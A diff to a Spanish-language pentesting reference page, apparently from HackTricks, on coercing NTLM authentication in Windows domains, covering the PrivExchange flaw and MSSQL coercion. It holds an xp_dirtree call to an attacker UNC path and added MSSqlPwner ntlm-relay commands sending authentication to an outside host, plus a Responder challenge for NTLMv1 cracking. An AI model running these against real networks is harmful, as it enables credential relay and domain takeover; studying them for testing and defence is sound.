@@ -64,7 +64,7 @@ Si un atacante ya ha comprometido una computadora con [Delegación No Restringid
 
 El ataque `PrivExchange` es el resultado de un defecto encontrado en la **función `PushSubscription` del Exchange Server**. Esta función permite que el servidor de Exchange sea forzado por cualquier usuario de dominio con un buzón para autenticarse en cualquier host proporcionado por el cliente a través de HTTP.
 
-Por defecto, el **servicio de Exchange se ejecuta como SYSTEM** y se le otorgan privilegios excesivos (específicamente, tiene **privilegios WriteDacl en el dominio antes de la Actualización Acumulativa de 2019**). Este defecto puede ser explotado para habilitar el **reenvío de información a LDAP y posteriormente extraer la base de datos NTDS del dominio**. En casos donde el reenvío a LDAP no es posible, este defecto aún puede ser utilizado para reenviar y autenticarse en otros hosts dentro del dominio. La explotación exitosa de este ataque otorga acceso inmediato al Administrador de Dominio con cualquier cuenta de usuario de dominio autenticada.
+Por defecto, el **servicio de Exchange se ejecuta como SYSTEM** y se le otorgan privilegios excesivos (específicamente, tiene **privilegios WriteDacl en el dominio antes de la Actualización Acumulativa de 2019**). Este defecto puede ser explotado para habilitar el **reenvío de información a LDAP y posteriormente extraer la base de datos NTDS del dominio**. En casos donde el reenvío a LDAP no es posible, este defecto aún puede ser utilizado para reenviar y autenticar a otros hosts dentro del dominio. La explotación exitosa de este ataque otorga acceso inmediato al Administrador de Dominio con cualquier cuenta de usuario de dominio autenticada.
 
 ## Dentro de Windows
 
@@ -77,6 +77,17 @@ C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -S
 ### MSSQL
 ```sql
 EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
+```
+[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
+```shell
+# Issuing NTLM relay attack on the SRV01 server
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250
+
+# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250
+
+# Issuing NTLM relay attack on the local server with custom command
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
 ```
 O utiliza esta otra técnica: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)
 
@@ -104,8 +115,8 @@ Si puedes realizar un ataque MitM a una computadora e inyectar HTML en una pági
 ```
 ## Cracking NTLMv1
 
-Si puedes capturar [los desafíos de NTLMv1, lee aquí cómo crackearlos](../ntlm/#ntlmv1-attack).\
-_Recuerda que para crackear NTLMv1 necesitas establecer el desafío de Responder en "1122334455667788"_
+Si puedes capturar [desafíos NTLMv1 lee aquí cómo crackearlos](../ntlm/#ntlmv1-attack).\
+_Recuerda que para crackear NTLMv1 necesitas establecer el desafío de Responder a "1122334455667788"_
 
 {% hint style="success" %}
 Aprende y practica Hacking en AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
